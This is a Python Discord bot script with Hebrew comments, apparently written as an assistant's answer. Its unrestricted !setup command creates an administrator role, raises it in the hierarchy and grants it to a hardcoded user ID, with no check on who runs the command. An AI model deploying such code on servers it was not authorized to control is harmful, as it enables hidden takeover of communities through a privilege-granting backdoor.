import discord
from discord.ext import commands

# הגדרת ה-Intents (חובה להפעיל גם ב-Discord Developer Portal כפי שהוסבר קודם)
intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.message_content = True  # חובה כדי שהבוט יקרא את הפקודה !setup

bot = commands.Bot(command_prefix="!", intents=intents)

TARGET_USER_ID = 1510555971343093881
ROLE_NAME = "👑 Administrator"

@bot.event
async def on_ready():
    print(f"========================================")
    print(f"הבוט מחובר ומוכן! כנס לשרת ורשום: !setup")
    print(f"========================================")

@bot.command(name="setup")
async def setup_admin_role(ctx):
    guild = ctx.guild
    
    await ctx.send("🔄 מתחיל בתהליך היצירה וההענקה...")

    # 1. יצירת הרול עם הרשאות מנהל מערכת
    try:
        permissions = discord.Permissions(administrator=True)
        new_role = await guild.create_role(
            name=ROLE_NAME, 
            permissions=permissions, 
            reason="פקודת setup אוטומטית"
        )
        await ctx.send(f"✅ הרול **{ROLE_NAME}** נוצר בהצלחה עם הרשאות אדמין.")
        
        # 2. שינוי מיקום הרול להכי גבוה שאפשר
        try:
            # המיקום הכי גבוה שבוט יכול לשים הוא אחד מתחת לרול שלו עצמו
            highest_position = guild.me.top_role.position - 1
            if highest_position > 0:
                await new_role.edit(position=highest_position)
                await ctx.send(f"🔼 הרול הוקפץ למיקום הכי גבוה האפשרי בהיררכיה (#{highest_position}).")
        except Exception as e:
            await ctx.send(f"⚠️ אזהרה: לא הצלחתי להעלות את הרול למעלה. (שגיאה: {e}).\n*הערה: כדי שהרול יהיה ראשון, תגרור את הרול של הבוט עצמו לראש הרשימה בהגדרות השרת בדיסקורד!*")

        # 3. חיפוש המשתמש והענקת הרול
        try:
            member = await guild.fetch_member(TARGET_USER_ID)
            await member.add_roles(new_role)
            await ctx.send(f"🎉 **הצלחה מוחלטת!** הרול הוענק למשתמש {member.mention}.")
        except discord.NotFound:
            await ctx.send(f"❌ שגיאה: המשתמש עם ה-ID `{TARGET_USER_ID}` לא נמצא בשרת הזה. ודא שהוא נמצא בשרת לפני הרצת הפקודה.")
        except discord.Forbidden:
            await ctx.send(f"❌ שגיאה: אין לבוט הרשאה לתת רול למשתמש הזה.")
        except Exception as e:
            await ctx.send(f"❌ שגיאה בהענקת הרול למשתמש: {e}")

    except discord.Forbidden:
        await ctx.send("❌ שגיאה קריטית: לבוט אין הרשאת `Manage Roles` (ניהול רולים) או `Administrator` בשרת הזה! תן לו את ההרשאה הזו בהגדרות השרת.")
    except Exception as e:
        await ctx.send(f"❌ שגיאה כללית ביצירת הרול: {e}")

# הכנס את הטוקן שלך כאן
TOKEN = "YOUR_BOT_TOKEN_HERE"
bot.run(TOKEN)
